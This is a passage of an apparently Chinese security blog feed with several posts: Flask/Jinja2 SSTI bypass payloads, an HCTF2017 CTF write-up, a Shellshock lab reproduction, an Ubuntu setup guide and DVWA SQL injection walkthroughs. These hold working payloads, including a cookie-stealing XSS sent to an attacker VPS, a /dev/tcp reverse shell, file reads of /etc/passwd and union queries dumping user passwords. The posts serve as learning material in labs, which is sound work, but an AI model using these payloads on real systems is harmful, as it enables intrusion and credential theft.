print('A.fun')...&gt;&gt;&gt; A.fun.__globals__&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;&#125;&gt;&gt;&gt; classA = A()&gt;&gt;&gt; classA.fun.__globals__&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;, 'classA': &lt;__main__.A object at 0x000001F2CA247F98&gt;&#125;&gt;&gt;&gt; classA.fun.__globals__.__class__&lt;class 'dict'&gt; __builtin__ 和 __builtins__启动Python解释器或运行一个Python程序时，内建名称空间都是从__builtins__模块中加载的，只是__builtins__本身是对Python内建模块__builtin__的引用，而这种引用又分下面两种情况: 如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名__builtin__指向的都是同一个模块，即内建模块(这里要注意变量名和对象本身的区别) 如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__ 建议查看官方文档 python3 builtins python2 __builtin__ 1234567# python 3.7.3&gt;&gt;&gt; dir('builtin')['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']&gt;&gt;&gt; __builtins__&lt;module 'builtins' (built-in)&gt;&gt;&gt;&gt; dir(__builtins__)['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] 123456# python 2.7.15&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module '__builtin__' (built-in)&gt;&gt;&gt;&gt; __builtins__&lt;module '__builtin__' (built-in)&gt; flask ssti 常用的 bypass绕过中括号 []利用 __getitem__()函数12"".__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()"".__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() 绕过引号利用chr()函数1&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 利用requests对象传参12&#123;&#123; "".__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;path=/etc/passwd 绕过下划线利用requests对象传参1234&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;class=__class__mro=__mro__subclasses=__subclasses__ 绕过大括号利用控制语句{&#37; &#37;}123&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %&#125;1&#123;% endif %&#125;&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %&#125;yes&#123;% endif %&#125; 读文件 12345678910111213141516import requestsurl = ''flag = ''dic = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*()_+-=[]&#123;&#125;;\':\",./&lt;&gt;?\\|'for i in range(150): for _ in dic: payload = '&#123;% if "".__class__.__mro__[2].__subclasses__()[40](\'/tmp/test\').read()[' + str(i) + ']==\'' + _ + '\' %&#125;yes&#123;% endif %&#125;' data = &#123; 'data': payload, &#125; r = requests.post(url, data=data).content.decode('utf8') if 'yes' in r: flag += _ breakprint(flag) 同时绕过 大括号 和 下划线利用 | &amp; attr()12345678&#123;% print ""|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(99)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)("o"+"s")|attr("popen")("ls")|attr(request.args.re)()|safe %&#125;globals=__globals__subclasses=__subclasses__re=readinit=__init__base=__base__class=__class__getitem=__getitem__ 总结 flask + jinja2 的 SSTI 和 python 沙箱逃逸有密不可分的关系，只有自己把内建函数搞清楚才能在遇到的时候靠自己写出来payload 遇到SSTI第一步一定要判断前后端是什么语言什么框架。 附:SSTI 模板判断导图，模板-语言关系图 图片来源:https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png 参考文章: https://xz.aliyun.com/t/3679http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/https://blog.51cto.com/xpleaf/1764849https://docs.python.org/3/https://blog.csdn.net/qq_35078631/article/details/78504415]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SSTI</tag>
        <tag>服务端模板注入</tag>
        <tag>python 沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-HCTF2017-Deserted place]]></title>
    <url>%2F2019%2F07%2F26%2FWriteup%2FWP-HCTF2017-Deserted-place%2F</url>
    <content type="text"><![CDATA[题目复现https://github.com/CTFTraining/hctf_2017_deserted_place/tree/a35b31966a139146dddf7d0a11c1aed1e585e7ea 1234git clone https://github.com/CTFTraining/hctf_2017_deserted_place.gitcd hctf_2017_deserted_placedocker-compose up -ddocker run -d -p 1000:80 ctftraining/hctf_2017_somexss:latest 访问 http://[你的ip]:1000/ 即可 分析本题的考点在 XSS 和 SOMEXSS 跨站，没什么好介绍的，这道题的主要考点在 SOME SOME (Same Origin Method Execution) 同源方法执行SOME 报告原文 提到 SOME 要先知道 jsonp ，简单来说，Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名(网站)那获取资料，即跨域读取数据。 网站交互时有时会需要用户要提供一个参数用作要被执行函数的函数名，然后网站在执行对应的 Javascript 函数。JSONP(JSON with Padding)就是允许用户传递一个回调参数给服务端，然后服务端返回数据时会将这个回调参数作为函数名来包裹住 JSON 数据。一个简单的 PHP 示例如下: 1234https://example.com/main &lt;?php echo ‘&lt;script src="https://example.com/jsonp?callback=’ . $_GET[“userParam”] .‘ “&gt;’; ?&gt; 在上面的代码段中，用户的输入被直接注入到了 script 标签中，JSONP(https://example.com/jsonp)会返回类似如下的内容: 1userParam(&#123; jsonp : data &#125;) // userParam 就是用户之前通过 GET 方法提交的内容 深入利用如果攻击者发现一个网站应用存在 SOME 漏洞，那他们绝不会仅仅满足于浏览网页上的各个元素，相反，通过使用 Javascript 内建的 window.opener 方法可以打开同源网站的其他页面。利用这种方法可以大大的扩展攻击面，但缺点也很明显就是需要打开多个页面。 使用 window.opener由于我们需要打开多个页面来进行攻击，所以用户必须先登录到攻击者控制的页面上，具体攻击流程如下: 用户登录到攻击者的控制的页面(后续称为Window 1)； 从 Window 1中启动一个新窗口(后续称为Window 2)； Window 2 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面； Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的目标页面； Window 2 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面； Window 2 以 window.opener.functionToExecute 作为回调进行执行； 此时，函数会在 Window 1 中被执行。 流程如下: 攻击步骤上一节提到的攻击可以被页面上额外的确认弹窗提示阻止，尽管如此，攻击者依旧可以通过以下流程产生额外的窗口来绕过检查: 用户登录到攻击者的控制的页面(后续称为Window 1)； 从 Window 1中启动一个新窗口(后续称为Window 2)； 从 Window 1中启动一个新窗口(后续称为Window 3)； Window 2 和 Window 3 是由 Window 1 通过 window.opener 打开的与攻击者控制页面同源的页面； Window 1 重定向到包含按钮或者其他攻击者想执行 Javascript 方法的页面； Window 2 和 Window 3 使用 window.opener 方法打开与 Window 1 目标页面同源的存在SOME漏洞的页面； Window 2 以 window.opener.buttonToClick.click 作为回调进行执行，此时 Window 1 页面上的按钮会被点击且同时弹出额外的确认弹窗； Window 3 以 window.opener.buttonToConfirm.click 作为回调进行执行，以此来点击 Window 1 页面上确认弹窗的确认按钮； Window 1 上的两个确认按钮均被点击，攻击完成。 扫描工具 SOMEtime BP插件SOMEtime 是一个 BurpSuite 开源的被动式扫描插件，通过监听 HTTP 请求与响应来判断目标是否存在 SOME 漏洞 如何缓解 网站应用应尽量使用静态定义的回调值； 如果你需要同时支持多个回调端点，最好的办法就是在服务端使用白名单控制回调值，只有指定的回调值才会被执行。 通常来说，JSONP 是一种可以用来绕过同源策略有争议的技术，如果不是必须要使用，建议使用 window.postMessage 这个更安全的方法来代替完成跨域请求执行。 题目解析题目环境功能有这么几个:登录，注册，修改信息，随机获取别人的信息并写入到自己的信息中，提交报告 测试发现修改信息 message 处存在 XSS 漏洞 然后来看report.php页面 用户可以输入一个 bug link ，然后输入一个需要爆破 md5 的验证码后提交 简单思路如下: 在 message 处构造 XSS payload ，payload 触发后跳转到公网 vps 的页面上并携带我们需要的COOKIE 将公网 vps 页面的 url 地址提交 等待管理员触发 XSS 触发后访问我们的 vps 页面，得到 COOKIE 需要的 payload 如下: vps上写两个页面: 1.html12345678&gt; &lt;script&gt;&gt; function start_some() &#123;&gt; window.open("2.html");&gt; location.replace("http://[题目地址]/user.php");&gt; &#125;&gt; setTimeout(start_some(), 1000);&gt; &lt;/script&gt;&gt; 2.html 1234567&gt; &lt;script&gt;&gt; function attack() &#123;&gt; location.replace("http://[题目地址]/edit.php?callback=RandomProfile&amp;user=[你的用户名]");&gt; &#125;&gt; setTimeout(attack, 2000);&gt; &lt;/script&gt;&gt; XSS payload:(因为message提交会将+转译成空格，这里需要将+url编码成%2b) &lt;img src=&quot;\&quot; onerror=window.location.href=&#39;http://[1.html的地址]?cookie=&#39;%2bdocument.cookie&gt; 写个简单的爆破脚本: 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# -*- encoding: utf-8 -*-# File : demo.py# Time : 2019/07/26 18:18:16# Author : AbelChe# Blog : https://www.abelche.com# Email : abelche@qq.com, ac.yucheng@gmail.comimport hashlibdef blasting(s): HSDICT = 'qwertyuiopasdfghjklzxcvbnm1234567890' for var1 in HSDICT: for var2 in HSDICT: for var3 in HSDICT: for var4 in HSDICT: for var5 in HSDICT: for var6 in HSDICT: s = hashlib.md5() payload = var1 + var2 + var3 + var4 + var5 + var6 s.update(payload.encode()) res = s.hexdigest()[0:6] if res == s: exit(payload + '\t' + res)if __name__ == "__main__": blasting(input('substr(md5($code),0,6) == ')) 好了，等管理员触发 XSS 然后访问 1.html 查看 cookie 即可 总结查看 /var/www/html/edit.php 回调 callback 代码如下: 1234567$callback = $_GET['callback'];preg_match("/\w+/i", $callback, $matches);......echo "&lt;script&gt;";echo $matches[0] . "();";echo "&lt;/script&gt;"; 提交数据的相关代码如下: 1234567891011121314151617181920212223242526&lt;script&gt;function UpdateProfile()&#123; var username = document.getElementById('user').value; var email = document.getElementById('email').value; var message = document.getElementById('mess').value; window.opener.document.getElementById("email").innerHTML="Email: "+email; window.opener.document.getElementById("mess").innerHTML="Message: "+message; console.log("Update user profile success..."); window.close();&#125;function EditProfile()&#123; document.onkeydown=function(event)&#123; if (event.keyCode == 13)&#123; UpdateProfile(); &#125; &#125;&#125;function RandomProfile()&#123; setTimeout('UpdateProfile()', 1000);&#125;&lt;/script&gt; 当我们点击 change something 图标，触发函数edit(): 12345678function edit()&#123; var newWin = window.open("./edit.php?callback=EditProfile",'','width=600,height=600'); var loop = setInterval(function() &#123; if(newWin.closed) &#123; clearInterval(loop); update(); &#125; &#125;, 1000); 点击 click me 图标，则触发函数random(): 12345678function random()&#123; var newWin = window.open("./edit.php?callback=RandomProfile",'','width=600,height=600'); var loop = setInterval(function() &#123; if(newWin.closed) &#123; clearInterval(loop); update(); &#125; &#125;, 1000); 明显random()打开的url中带有的 callback 参数值为 RandomProfile ，触发了edit.php 页面中的 RandomProfile() 函数 参考文章:https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/https://blog.csdn.net/yanghuan313/article/details/53829453https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>SOME</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bash 远程代码执行漏洞(CVE-2014-6271)复现]]></title>
    <url>%2F2019%2F07%2F25%2FCVE%2FBash%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[分析CGICGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。CGI环境变量列表: SERVER-NAME:运行CGI序为机器名或IP地址。 SERVER-INTERFACE:WWW服务器的类型，如:CERN型或NCSA型。 SERVER-PROTOCOL:通信协议，应当是HTTP/1.0。 SERVER-PORT:TCP端口，一般说来web端口是80。 HTTP-ACCEPT:HTTP定义的浏览器能够接受的数据类型。 HTTP-REFERER: 发送表单的文件URL。(并非所有的浏览器都传送这一变量) HTTP-USER-AGENT:发送表单的浏览器的有关信息。 GETWAY-INTERFACE:CGI程序的版本，在UNIX下为 CGI/1.1。 PATH-TRANSLATED: PATH-INFO中包含的实际路径名。 PATH-INFO:浏览器用GET方式发送数据时的附加路径。 SCRIPT-NAME: CGI程序的路径名。 QUERY-STRING:表单输入的数据，URL中间号后的内容。 REMOTE-HOST:发送程序的主机名，不能确定该值。 REMOTE-ADDR:发送程序的机器的IP地址。 REMOTE-USER:发送程序的人名。 CONTENT-TYPE:POST发送，一般为applioation/xwww-form-urlencoded。 CONTENT-LENGTH:POST方法输入的数据的字节数 Web服务器可以解析(handles)HTTP协议。当Web服务器接收到一个HTTP请求(request)，会返回一个HTTP响应 (response)，例如送回一个HTML页面。为了处理一个请求(request)，Web服务器可以响应(response)一个静态页面或图片，进行页面跳转(redirect)，或者把动态响应(dynamic response)的产生委托(delegate)给一些其它的程序例如CGI脚本，JSP(JavaServer Pages)脚本，servlets，ASP(Active Server Pages)脚本，服务器端(server-side)JavaScript，或者一些其它的服务器端(server-side)技术。无论它们的目的如何，这些服务器端(server-side)的程序通常产生一个HTML的响应(response)来让浏览器可以浏览。 流程 复现 GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。 此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。 环境搭建https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271 12# docker pull medicean/vulapps:b_bash_shellshock1# docker run -d -p 1000:80 medicean/vulapps:b_bash_shellshock1 然后访问 http://[你的ip]:1000 即可 漏洞复现 点击页面上的 poc.cgi 后跳转到如图页面 明显返回的是 cgi 环境变量 bp抓包 将http头中除GET之外的某一处数据改为() { :;}; echo ;echo ;echo 123; 例如:User-Agent: () { :;}; echo ;echo ;echo 123;然后发包 发现命令执行成功了 然后测试执行系统命令() { :;}; echo ;echo ;echo $(/bin/cat /etc/passwd); 明显执行成功 那么弹shell也不在话下() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/[弹到你的公网ip]/[端口号] 0&gt;&amp;1; 测试成功 来自官方说明:部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量 User-Agent: () { :;};echo ; echo; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo $(/bin/ls -al /); 总结 进入到环境中docker exec -it dazzling_tu /bin/bash进入poc.cgi所在目录cd /usr/local/apache2/cgi-bin查看poc.cgi的内容cat poc.cgi 1234567891011121314#!/bin/bashecho "Content-type: text/html"echo ""echo '&lt;html&gt;'echo '&lt;head&gt;'echo '&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;'echo '&lt;title&gt;Bash ShellShock&lt;/title&gt;'echo '&lt;/head&gt;'echo '&lt;body&gt;'echo '&lt;pre&gt;'/usr/bin/envecho '&lt;/pre&gt;'echo '&lt;/body&gt;'echo '&lt;/html&gt;' 漏洞就是在这里/usr/bin/env产生的 大致流程如下: HTTP 头参数传入 env 环境变量接受到参数 bash 执行环境变量中的字符串(黑客构造好的 payload 在这里执行) 结果保存在当前会话的环境变量中随着 response 返回到客户端 黑客愉快的进下一步操作 经验+1:扫到/cgi-bin/ .cgi .sh 等目录或文件可以进行有关bash代码注入的测试 payload: () { :;}; echo ; echo ; echo &quot;this test is success!&quot;; 参考文章:https://github.com/Medicean/VulApps/blob/master/b/bash/shellshock1_CVE-2014-6271/README.mdhttps://www.cnblogs.com/qmfsun/p/7591757.html]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>远程代码执行</tag>
        <tag>cgi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用工具集(持续更新)]]></title>
    <url>%2F2019%2F07%2F25%2F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[扫描器web目录扫描器 跨平台的web目录扫描器 https://github.com/AbelChe/webdirscan 动态多线程敏感信息泄露检测工具 https://github.com/AbelChe/weakfilescan 快速地对大量目标进行扫描 https://github.com/lijiejie/BBScan]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu1804 折腾全集]]></title>
    <url>%2F2019%2F06%2F27%2FUbuntu1804%20%E6%8A%98%E8%85%BE%E5%85%A8%E9%9B%86%2F</url>
    <content type="text"><![CDATA[安装 Ubuntu1804下载系统镜像https://ubuntu.com/download/desktop 安装系统 将下载到的镜像用 Win32DiskImager 等镜像写入工具写入到一个足够大小的 U 盘上 安装时选择 U 盘启动，跟着引导一步一步往下走 磁盘分区: 清空整个磁盘为将整块磁盘格式化后安装系统，盘上还有资料的不要选；自定义分区，可以参考这盘文章https://blog.csdn.net/u012052268/article/details/77145427/或者自己百度，要注意分完区要选择引导的安装位置，一般是你所安装的这块磁盘，而不是boot分区！！！ 然后就等着安装完成重启电脑就 OK 了 (如果你是 Nvidia 用户) 如果你是 Nvidia 用户，那么恭喜你，你会发现重启电脑进入系统卡死在 logo 页面死活进不去系统这是因为 linux 系统的 nauveau 开源显卡驱动的原因，解决方案如下:引导时先选到进入系统的选项，按 e 键，找到倒数第二行的 quiet splash ，在后面添加 acpi_osi=linux nomodeset(splash后面别忘了加个空格哈) 再按 ctrl+x 引导即可进入系统。进入系统后打开软件更新器，找到附加驱动，它会检测你合适的官方驱动，找一个稳定的安装就行了。 优化你的 Ubuntu换源国内用户第一件事一定要换源！换源！换源！先备份一下默认源 1sudo /etc/apt/sources.list /etc/apt/sources.list.bak 然后用下面的源替换掉原来的源 1sudo vi /etc/apt/sources.list 123456789101112131415deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe 然后更新 123sudo apt-get updatesudo apt-get upgradesudo apt-get -f install 安装常用软件 环境 vim sudo apt-get install vim gedit sudo apt-get install gedit ssh sudo apt-get install ssh apache sudo apt-get install apache2 mysql sudo apt-get install mysql-server pycharm 商店里面搜索就可以下载 vscode 商店里搜索 网易云音乐 去官网下载安装包，双击安装 qq 微信 百度网盘 迅雷等(有些必要的运行库可能会与系统冲突，慎重) https://github.com/AbelChe/deepin-wine-ubuntu docker sudo apt-get install docker docker.io docker-compose 美化https://www.jianshu.com/p/f9e905abea91差不多了]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Ubuntu</tag>
        <tag>美化</tag>
        <tag>配置环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用DVWA进行简单的漏洞学习]]></title>
    <url>%2F2019%2F04%2F25%2F%E5%88%A9%E7%94%A8DVWA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SQL InjectionLow Level判断注入类型在输入框中输入1，然后提交得到如下内容输入1’，提交得到You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1说明存在字符型的SQL注入。 猜解字段数通过order by进行猜解字段数1&#39; order by 1#正常1&#39; order by 2#正常1&#39; order by 3#返回错误说明查询的字段数是两个那么查询语句的结构差不多就是select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=&lt;value&gt;; 尝试爆出所有字段那么我们可以尝试构造1&#39; or &#39;1&#39;=&#39;1来爆出所查询的表里的所有字段(因为是字符型注入，所以要考虑引号的闭合)还原成SQL语句即为select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=1 or 1=1; union拼接查询敏感信息使用联合查询 union 可以爆出我们想知道的一些数据库敏感信息关于MySQL的information_schema库爆出数据库名 1&#39; union select database(),2;#爆出数据库表1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#爆出表中的所有列1&#39; union select 1,column_name from information_schema.columns where table_name=&#39;users&#39;#查出用户名和密码1&#39; union select user,password from users# 审计源码和总结源码如下 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; mysqli_close($GLOBALS["___mysqli_ston"]);&#125;?&gt; 可以看到程序没有对输入的变量$id做任何安全处理，这也直接导致了sql注入的产生 Medium Level选择Medium等级，发现对输入做了明显的输入限制，从自由输入变为选择id虽然我们在页面上无法进行输入，但是我们可以通过抓包更改数据的方式进行SQL注入 配好代理，打开bp开始抓包，抓到数据包发现是数字型注入，方式和low等级方式基本相同要注意的是转义了’等符号，在提交时会将’，”等符号转义为&#39;，&quot;所以在payload中不要出现引号 先order by查字段数 id=1 or 1=1id=1 union select database(),2id=1 union select table_name,2 from information_schema.tables where table_schema=database()因为转移了引号，所以这里的表名用16进制进行绕过引号id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x75736572id=1 union select user,password from users High Leavel分析 high 等级的源码 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row["first_name"]; $last = $row["last_name"]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); &#125;?&gt; high等级的查询是通过在弹出页面输入id然后提交进行查询，将数据展示在原页面上，而且id的值储存在了SESSION中，程序也没有对id进行任何的安全处理，这样产生了sql注入问题high等级的这种做法能够避免sqlmap进行爆破，但是如果不对数据进行安全处理，还是会引发安全问题 high等级的注入payload和low等级的基本相同 1234567' order by 1# 正常' order by 2# 正常' order by 3# 返回错误字段数为2' union select 1,database()# 查数据库名' union select 1,table_name from information_schema.tables where table_schema=database()# 查表名' union select 1,column_name from information_schema.columns where table_name='users'# 查列名' union select user,password from dvwa.users# 查字段 SQL Injection(Blind) 对于基于布尔的盲注，可通过构造真or假判断条件(数据库各项信息取值的大小比较，如:字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…)，将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果(True、False)；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。 对于基于时间的盲注，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假(若执行sleep延迟，则表示当前设置的判断条件为真)；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。 报错型注入则是利用了MySQL的第8652号bug :Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果。 以下使用的方法均为基于布尔的盲注基于时间的盲注参考传送门 Low Level判断注入类型 payload 结果 1 User ID exists in the database. 1’ User ID is MISSING from the database. 0 User ID is MISSING from the database. 1 and 1=1# User ID exists in the database. 1’ and 1=1# User ID exists in the database. 1 and 1=2# User ID exists in the database. 1’ and 1=2# User ID is MISSING from the database. 说明存在字符型的sql盲注 猜解数据库名 猜解数据库名的长度 payload 结果 1’ and length(database())&lt;10# User ID exists in the database. 